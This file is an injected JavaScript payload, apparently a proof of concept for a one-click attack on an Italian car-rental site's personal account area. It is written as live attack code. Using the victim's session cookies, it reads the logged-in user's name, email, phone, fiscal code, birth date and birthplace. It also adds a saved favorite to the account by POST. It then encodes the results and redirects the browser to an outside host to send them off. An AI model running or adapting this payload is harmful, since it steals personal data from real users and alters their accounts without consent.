(() => {
  window.name = "javascript:void 0";
  if (window.__t166679HostedProofStarted) return;
  window.__t166679HostedProofStarted = true;
  const statusNode = document.createElement("div");
  statusNode.id = "t166679-running";
  statusNode.textContent = "Collecting proof...";
  statusNode.style.cssText = "position:fixed;inset:16px auto auto 16px;z-index:2147483647;padding:12px 16px;background:#111;color:#7ee787;border:1px solid #7ee787;border-radius:6px;font:16px system-ui";
  (document.body || document.documentElement).appendChild(statusNode);

(async () => {
  if (window.__t166679FavoritesProofRunning) {
    return;
  }
  window.__t166679FavoritesProofRunning = true;
  const output = document.documentElement.dataset;
  const result = {
    done: false,
    executedOrigin: location.origin,
    authenticatedPrincipalOnly: true,
    rawAccountDataPersisted: false,
    publicOfferOnly: true,
    persistentProof: true,
    mutationAttempted: false,
    favoriteLeftSaved: false,
  };
  const apiBase = "/noleggio-auto/api/";
  const candidateOfferUuid = "af7c36ef-efa1-4750-b9c9-bd32bd83664c";
  const candidateRateUuid = "5657957c-2cd2-4125-b90b-4d308e1ed8ea";
  let baseline = null;
  let candidate = null;

  const finish = (extra = {}) => {
    Object.assign(result, extra, { done: true });
    output.t166679FavoriteIntegrity = JSON.stringify(result);
  };

  const digest = async (value) => {
    const bytes = new TextEncoder().encode(value);
    const hash = await crypto.subtle.digest("SHA-256", bytes);
    return [...new Uint8Array(hash)]
      .map((byte) => byte.toString(16).padStart(2, "0"))
      .join("");
  };

  const request = (path, options = {}) => fetch(`${apiBase}${path}`, {
    credentials: "include",
    cache: "no-store",
    ...options,
  });

  const parseFavoriteState = (text, label) => {
    let parsed;
    try {
      parsed = JSON.parse(text);
    } catch {
      throw new Error(`${label}_INVALID_JSON`);
    }
    if (!Array.isArray(parsed?.favorites) || !Array.isArray(parsed?.savedSearches)) {
      throw new Error(`${label}_INVALID_SHAPE`);
    }
    return parsed;
  };

  const getFavorites = async (label) => {
    const response = await request("favorites");
    const text = await response.text();
    result[`${label}Status`] = response.status;
    result[`${label}Length`] = new TextEncoder().encode(text).length;
    result[`${label}Sha256`] = await digest(text);
    if (response.status !== 200) {
      throw new Error(`${label.toUpperCase()}_${response.status}`);
    }
    return { raw: text, state: parseFavoriteState(text, label) };
  };

  const hasCandidate = (favorites) => favorites.some((item) => (
    item?.offerUuid === candidate.offerUuid
    && item?.offerType === candidate.offerType
    && item?.rateUuid === candidate.rateUuid
  ));

  const baselineItemsPresent = (favorites) => baseline.favorites.every((oldItem) => (
    favorites.some((item) => (
      item?.offerUuid === oldItem?.offerUuid
      && item?.offerType === oldItem?.offerType
      && item?.rateUuid === oldItem?.rateUuid
    ))
  ));

  const postFavorites = async (path, body, label) => {
    const response = await request(path, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(body),
    });
    const text = await response.text();
    result[`${label}Status`] = response.status;
    result[`${label}Length`] = new TextEncoder().encode(text).length;
    result[`${label}Sha256`] = await digest(text);
    return response.status;
  };

  try {
    output.t166679FavoriteIntegrityStage = "executed";
    const accountResponse = await fetch(
      new URL("/area-personale/account", location.origin),
      { credentials: "include", cache: "no-store" },
    );
    const accountBody = await accountResponse.text();
    result.accountCheckStatus = accountResponse.status;
    if (accountResponse.status !== 200) {
      throw new Error(`ACCOUNT_CHECK_${accountResponse.status}`);
    }
    const accountDoc = new DOMParser().parseFromString(accountBody, "text/html");
    const accountNextText = (
      accountDoc.querySelector("script#__NEXT_DATA__")?.textContent || ""
    );
    const accountData = JSON.parse(accountNextText);
    const accountUser = accountData?.props?.props?.initialState?.value?.auth?.user;
    result.authenticatedAccountUuid = accountUser?.uuid ?? null;
    result.authenticatedAccountConfirmed = (
      typeof result.authenticatedAccountUuid === "string"
      && result.authenticatedAccountUuid.length > 0
    );
    if (!result.authenticatedAccountConfirmed) {
      throw new Error("AUTHENTICATED_ACCOUNT_NOT_FOUND");
    }

    const baselineResponse = await getFavorites("baseline");
    baseline = baselineResponse.state;
    result.preWriteFavoriteAccountUuid = baseline.myAreaUserId ?? null;
    result.preWriteFavoriteRecordPresent = (
      typeof result.preWriteFavoriteAccountUuid === "string"
    );
    result.preWriteAccountBindingMatched = (
      !result.preWriteFavoriteRecordPresent
      || result.preWriteFavoriteAccountUuid === result.authenticatedAccountUuid
    );
    if (!result.preWriteAccountBindingMatched) {
      throw new Error("ACCOUNT_FAVORITES_MISMATCH");
    }
    result.baselineFavoriteCount = baseline.favorites.length;
    result.baselineSavedSearchCount = baseline.savedSearches.length;

    const offersResponse = await request("seo-page/offers");
    const offersText = await offersResponse.text();
    result.offersStatus = offersResponse.status;
    result.offersLength = new TextEncoder().encode(offersText).length;
    result.offersSha256 = await digest(offersText);
    if (offersResponse.status !== 200) {
      throw new Error(`OFFERS_${offersResponse.status}`);
    }
    let offersPayload;
    try {
      offersPayload = JSON.parse(offersText);
    } catch {
      throw new Error("OFFERS_INVALID_JSON");
    }
    const offers = Array.isArray(offersPayload)
      ? offersPayload
      : offersPayload?.offers;
    if (!Array.isArray(offers)) {
      throw new Error("OFFERS_INVALID_SHAPE");
    }
    result.publicOfferCount = offers.length;
    const offer = offers.find((item) => (
      item?.status === "published"
      && item?.uuid === candidateOfferUuid
      && item?.rate?.type === "b2c"
      && item?.rate?.uuid === candidateRateUuid
    ));
    if (!offer) {
      throw new Error("NO_SAFE_PUBLIC_CANDIDATE");
    }
    candidate = {
      offerUuid: offer.uuid,
      offerType: offer.rate.type,
      rateUuid: offer.rate.uuid,
    };
    result.candidate = candidate;
    result.candidateDisplay = {
      brand: offer.brand ?? null,
      model: offer.model ?? null,
      version: offer.version ?? null,
      monthlyFee: offer.rate.monthlyFee ?? null,
      link: offer.link ?? null,
    };
    result.stateVerificationPath = "/noleggio-auto/preferiti.html";
    result.candidateSha256 = await digest(
      `${candidate.offerUuid}|${candidate.offerType}|${candidate.rateUuid}`,
    );
    result.candidateWasAbsent = !hasCandidate(baseline.favorites);
    if (!result.candidateWasAbsent) {
      result.candidatePersisted = true;
      result.candidateAlreadyPresent = true;
      result.changedFavoriteCount = baseline.favorites.length;
      result.postWriteFavoriteAccountUuid = result.preWriteFavoriteAccountUuid;
      result.postWriteAccountBindingMatched = result.preWriteAccountBindingMatched;
      result.favoriteLeftSaved = true;
      finish();
      return;
    }

    result.mutationAttempted = true;
    const addStatus = await postFavorites(
      "favorites",
      { favorites: [candidate] },
      "add",
    );
    if (addStatus !== 200) {
      throw new Error(`ADD_${addStatus}`);
    }

    const changed = await getFavorites("changedGet");
    result.postWriteFavoriteAccountUuid = changed.state.myAreaUserId ?? null;
    result.postWriteAccountBindingMatched = (
      result.postWriteFavoriteAccountUuid === result.authenticatedAccountUuid
    );
    result.candidatePersisted = hasCandidate(changed.state.favorites);
    result.baselineItemsStillPresent = baselineItemsPresent(changed.state.favorites);
    result.savedSearchesUnchangedAfterAdd = (
      JSON.stringify(changed.state.savedSearches) === JSON.stringify(baseline.savedSearches)
    );
    result.changedFavoriteCount = changed.state.favorites.length;
    if (!result.candidatePersisted) {
      throw new Error("ADD_NOT_PERSISTED");
    }
    if (!result.postWriteAccountBindingMatched) {
      throw new Error("POST_WRITE_ACCOUNT_FAVORITES_MISMATCH");
    }
    if (!result.baselineItemsStillPresent || !result.savedSearchesUnchangedAfterAdd) {
      throw new Error("UNEXPECTED_ACCOUNT_STATE_CHANGE");
    }
    result.favoriteLeftSaved = true;
    finish();
  } catch (error) {
    const safeError = error instanceof Error ? error.message.slice(0, 96) : "UNKNOWN";
    finish({ error: safeError });
  }
})();

(() => {
  const output = document.documentElement.dataset;
  const result = {
    done: false,
    executedOrigin: location.origin,
    accountPath: "/area-personale/account",
  };

  const digest = async (value) => {
    const bytes = new TextEncoder().encode(value);
    const hash = await crypto.subtle.digest("SHA-256", bytes);
    return [...new Uint8Array(hash)]
      .map((byte) => byte.toString(16).padStart(2, "0"))
      .join("");
  };

  (async () => {
    try {
      const response = await fetch(
        new URL("/area-personale/account", location.origin),
        { credentials: "include", cache: "no-store" },
      );
      const body = await response.text();
      result.accountStatus = response.status;
      result.responseLength = new TextEncoder().encode(body).length;
      result.responseSha256 = await digest(body);
      if (response.status !== 200) {
        throw new Error(`ACCOUNT_${response.status}`);
      }

      const doc = new DOMParser().parseFromString(body, "text/html");
      const nextText = doc.querySelector("script#__NEXT_DATA__")?.textContent || "";
      const parsed = JSON.parse(nextText);
      const user = parsed?.props?.props?.initialState?.value?.auth?.user;
      if (!user || typeof user !== "object") {
        throw new Error("ACCOUNT_USER_NOT_FOUND");
      }
      const profile = user?.mainPerson?.profile || {};
      result.profileData = {
        firstName: profile.name ?? null,
        surname: profile.surname ?? null,
        email: user.email ?? null,
        phone: user?.phone?.phoneNumber ?? null,
        phoneVerified: user?.phone?.verified ?? null,
        uuid: user.uuid ?? null,
        fiscalCode: profile.fiscalCode ?? null,
        fiscalCodePatternValid: /^([A-Z]{6}\d{2}[A-Z]\d{2}[A-Z]\d{3}[A-Z])$/i.test(
          profile.fiscalCode || "",
        ),
        gender: profile.gender ?? null,
        birthDate: profile.birthDate ?? null,
        birthPlace: profile.birthPlace ?? null,
        addressCount: Array.isArray(user.addresses) ? user.addresses.length : null,
        emailHash: user.emailHash ?? null,
        phoneHash: user.phoneHash ?? null,
      };
    } catch (error) {
      result.error = error instanceof Error ? error.message.slice(0, 120) : "UNKNOWN";
    } finally {
      result.done = true;
      output.t166679OneClickAccount = JSON.stringify(result);
    }
  })();
})();

(() => {
  if (window.__t166679PublicResultRunning) return;
  window.__t166679PublicResultRunning = true;
  const proofScript = document.currentScript?.src || null;
  const started = Date.now();
  const encode = (value) => {
    const bytes = new TextEncoder().encode(JSON.stringify(value));
    let binary = "";
    for (let offset = 0; offset < bytes.length; offset += 32768) {
      binary += String.fromCharCode(...bytes.subarray(offset, offset + 32768));
    }
    return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  };
  const deliver = (type, account, favorite) => {
    const result = {
      type,
      page: {
        origin: location.origin,
        baseUri: document.baseURI,
        proofScript,
        receiver: "https://niccoloparlanti.com/r.html",
      },
      account,
      favorite,
    };
    window.name = "javascript:void 0";
    location.replace("https://niccoloparlanti.com/r.html#" + encode(result));
  };
  const timer = setInterval(() => {
    let account = null;
    let favorite = null;
    try {
      account = JSON.parse(document.documentElement.dataset.t166679OneClickAccount || "null");
    } catch (_) {}
    try {
      favorite = JSON.parse(document.documentElement.dataset.t166679FavoriteIntegrity || "null");
    } catch (_) {}
    if (account?.done === true && favorite?.done === true) {
      clearInterval(timer);
      deliver("T166679_ONE_CLICK_RESULT", account, favorite);
      return;
    }
    if (Date.now() - started > 150000) {
      clearInterval(timer);
      deliver("T166679_ONE_CLICK_TIMEOUT", account, favorite);
    }
  }, 250);
})();
})();
